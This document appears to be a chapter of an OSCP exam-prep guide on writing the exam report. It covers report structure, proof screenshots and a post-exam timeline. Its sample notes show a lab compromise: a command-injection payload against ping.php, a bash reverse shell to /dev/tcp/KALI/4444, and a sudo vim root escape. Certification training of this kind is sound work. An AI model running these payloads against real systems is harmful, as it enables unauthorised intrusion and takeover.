# 15 — Report Writing

**No report = automatic fail.** This is not optional. Even if you root every machine, you get zero points without a submitted report.

---

## Report Structure

### Cover page

```
Offensive Security
OSCP Exam Report

Student Name: [Your Name]
OSID: OS-XXXXX
Date: [Exam Date]
```

### For each machine (repeat this section for every target)

```
## Machine: 192.168.X.X

### Service Enumeration

[Full nmap output — paste the complete scan]

### Initial Access

**Vulnerability:** [Name and description of the vulnerability]

**Proof of Concept:**

Step 1: [Exact command]
[Screenshot of output]

Step 2: [Exact command]
[Screenshot of output]

...continue until you have a shell...

**Local.txt:**
[Screenshot containing: flag contents + whoami + ip a/ipconfig]

### Privilege Escalation

**Vulnerability:** [Name and description]

**Proof of Concept:**

Step 1: [Exact command]
[Screenshot of output]

...continue until root/SYSTEM...

**Proof.txt:**
[Screenshot containing: flag contents + whoami + ip a/ipconfig]
```

---

## Screenshot Requirements

### What MUST be in every proof screenshot

**Linux proof:**
```bash
cat /path/to/local.txt && whoami && ip a
```

**Windows proof:**
```cmd
type C:\Users\user\Desktop\local.txt & whoami & ipconfig
```

The screenshot MUST show all three items: **flag content + username + IP address** in ONE screenshot. Separate screenshots for each item may not be accepted.

### Additional screenshots to take

For every significant step:
- The nmap output
- The vulnerability discovery (web page, misconfiguration, etc.)
- The exploit execution
- The shell you received
- The privesc enumeration result (sudo -l output, SUID listing, etc.)
- The privesc exploitation

**Take MORE screenshots than you think you need.** You can't go back and re-take them after the exam ends.

### Screenshot tips

```
- Use the whole terminal — maximize it before the screenshot
- Make sure the text is readable (increase font size if needed)
- Include the command AND the output in the same screenshot
- Highlight or annotate key findings if possible
- Save screenshots with descriptive names:
    standalone1_nmap.png
    standalone1_initial_access.png
    standalone1_local_txt.png
    standalone1_privesc.png
    standalone1_proof_txt.png
```

---

## Writing the Report During the Exam

### Document as you work — don't wait

Keep a running document for each machine. Every time you run a command that matters, paste it into your notes:

```
## 192.168.X.10 — Standalone 1

### Nmap
$ nmap -sV -sC -oA s1 192.168.X.10
[paste output]

### Web Enumeration
$ gobuster dir -u http://192.168.X.10 -w common.txt -x php
/admin (Status: 301)
/backup (Status: 301)
/config.bak (Status: 200)

$ curl http://192.168.X.10/config.bak
Found: DB_USER=admin DB_PASS=SqlP@ss123

### Initial Access
$ curl "http://192.168.X.10/admin/ping.php?ip=127.0.0.1;whoami"
www-data

$ nc -lvnp 4444
$ curl "http://192.168.X.10/admin/ping.php?ip=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/KALI/4444+0>%261'"
Shell received as www-data
[SCREENSHOT: standalone1_shell.png]

$ cat /home/user/local.txt && whoami && ip a
abc123def456
www-data
192.168.X.10
[SCREENSHOT: standalone1_local.png]

### Privilege Escalation
$ sudo -l
(root) NOPASSWD: /usr/bin/vim

$ sudo vim -c ':!bash'
# whoami
root

$ cat /root/proof.txt && whoami && ip a
xyz789abc012
root
192.168.X.10
[SCREENSHOT: standalone1_proof.png]
```

This IS your report draft. After the exam, clean it up, add proper formatting, insert screenshots, and export as PDF.

---

## Common Report Mistakes That Lose Points

```
1. Missing proof screenshots (flag + whoami + ip a in the same screenshot)
2. Commands that aren't reproducible (you paraphrased instead of copy-pasting)
3. Missing steps (you skipped from "found vulnerability" to "got shell" without showing how)
4. No nmap output included
5. Submitting after the 24-hour deadline
6. Not using PDF format
7. Screenshots too small to read
8. Forgetting a machine entirely (even if you got partial access)
```

---

## The Report Writing Timeline

```
Exam ends (23:45 mark)
│
├── 30-60 minutes: Break (eat, decompress, don't touch the computer)
│
├── 1-2 hours: Organize notes and screenshots
│   - Group everything by machine
│   - Rename screenshots descriptively
│   - Review what you have vs what's needed
│
├── 3-6 hours: Write the report
│   - Use the OffSec template
│   - One section per machine
│   - Paste commands exactly as you ran them
│   - Insert screenshots
│   - Write clear explanations of each step
│
├── 1 hour: Proofread
│   - Are all commands correct and reproducible?
│   - Are all screenshots present and readable?
│   - Did you include proof for every flag you captured?
│   - Is the PDF properly formatted?
│
└── Submit (well before the deadline — don't wait until the last minute)
```

---

## Exam Tip

**The report is not creative writing.** It's a technical document. Write it like you're explaining to a colleague how to reproduce your work. Clear, step-by-step, with exact commands and proof at each stage. If someone could follow your report and get the same results, it's a good report.
